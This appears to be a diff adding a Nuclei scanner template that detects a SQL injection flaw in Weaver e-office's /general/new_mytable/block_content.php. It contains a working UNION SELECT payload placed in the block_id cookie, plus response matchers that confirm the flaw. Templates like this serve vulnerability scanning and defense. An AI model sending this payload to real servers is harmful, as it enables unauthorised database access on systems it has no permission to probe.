@@ -1,0 +1,31 @@
+id: weaver-eoffice-block_content-sqli
+info:
+  name: 泛微e-office block_content.php sql注入漏洞
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://mrxn.net/jswz/eoffice-general-new_mytable-block_content-sqli.html
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: weaver,eoffice,sqli
+
+http:
+  - raw:
+      - |
+        GET /general/new_mytable/block_content.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: block_id=1 UNION ALL SELECT CONCAT(0x7162707a71,0x6572537871644b6d50686268596d52564d654b6175746d52476b5a716c65567a52416b787a556a42,0x716a767171)-- -
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'qbpzqerS')
+        condition: and
